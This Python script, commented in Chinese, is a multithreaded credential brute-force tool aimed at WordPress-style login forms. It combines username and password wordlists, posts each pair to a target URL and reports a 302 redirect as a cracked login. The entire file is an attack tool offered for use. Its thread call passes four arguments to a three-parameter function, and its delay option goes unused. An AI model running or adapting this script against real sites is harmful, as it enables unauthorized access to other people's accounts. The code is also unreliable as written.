'''
    描述：爆破脚本，用户名+密码排列组合方式，推荐精简名字典
        支持参数、进度条、Ctrl C功能
    version：2.0
    author：chen
    date：2021-08-13
'''

import sys
import threading
import requests
import getopt
import queue
from rich.progress import Progress


# 参数处理
def para(argv):
    global dicts
    dicts = {'url': '', 'thread': '', 'delay': '', 'file_name': '', 'file_pass': ''}

    try:
        opts, args = getopt.getopt(argv, "u:hT:", ["url=", "fname=", "fpass=", "delay="])
    except getopt.GetoptError:
        print("python brute2.0.py -u http:test.com --fname C:\\Users\\Chen\\Desktop\\Temp\\user.txt --fpass C:\\Users\\Chen\\Desktop\\Temp\\pass.txt -T 100")

    for opt, arg in opts:
        if opt == '-h':
            print("python brute2.0.py -u http:test.com --fname C:\\Users\\Chen\\Desktop\\Temp\\user.txt --fpass C:\\Users\\Chen\\Desktop\\Temp\\pass.txt -T 100")
            exit()
        elif opt in ("-u", "--url"):
            dicts['url'] = arg
            # print('url:', dicts['url'])
        elif opt == '-T':
            dicts['thread'] = arg
            # print('线程:', dicts['thread'])
        elif opt == '--delay':
            dicts['delay'] = arg
            # print('发包延时:%sms' % dicts['delay'])
        elif opt == '--fname':
            dicts['file_name'] = arg
            # print('用户名字典:', dicts['file_name'])
        elif opt == '--fpass':
            dicts['file_pass'] = arg
            # print('密码字典:', dicts['file_pass'])


# 初始化字典队列
def init(fname, fpass, q):
    # 排列组合模式生成字典队列，两个都过大时会导致初始化很慢。
    # 建议精简用户名字典，合适的密码字典
    print('正在初始化字典队列...')
    for i in open(fname):
        for j in open(fpass):
            # 以列表形式写入队列
            q.put([i.strip(), j.strip()])
    print('字典队列初始化完毕！')


def run(q, BarId, url):
    while not q.empty():
        que = q.get()

        # 爆破目标的核心数据包，根据实际情况更改
        data = {
            "log": que[0],
            "pwd": que[1],
            "wp-submit": "%E7%99%BB%E5%BD%95"
        }
        # 代理，自定义
        proxy = {
            'http': 'http://127.0.0.1:7890',
            'https': 'https://127.0.0.1:7890'
        }

        # 发包，禁止302跳转，否则抓不到302返回状态码
        # 可取消代理
        rep = requests.post(url=url, data=data, allow_redirects=False)
        if rep.status_code == 302:
            print('\033[32m爆破成功! {0}:{1}\033[0m' .format(que[0], que[1]))
            # 爆破成功进度条拉满，触发主进程守护，结束进程
            progress.update(BarId, advance=999999999)
        # 更新进度条
        progress.update(BarId, advance=1)


if __name__ == '__main__':
    dicts = {}
    q = queue.Queue()

    # 初始化参数
    para(sys.argv[1:])
    # 初始化队列
    url = dicts['url']
    delay = dicts['delay']
    init(dicts['file_name'], dicts['file_pass'], q)

    # 进度条初始化
    with Progress() as progress:
        BarId = progress.add_task('[green]Status:', total=q.qsize())
        # 多线程数量
        for i in range(int(dicts['thread'])):
            # 设置主线程守护
            t = threading.Thread(target=run, args=[q, BarId, url, delay], daemon=True)
            t.start()

        # 进度条结束，终止主程序运行
        # 解决Ctrl+C终止程序 和 程序自动结束的问题
        while not progress.finished:
            pass

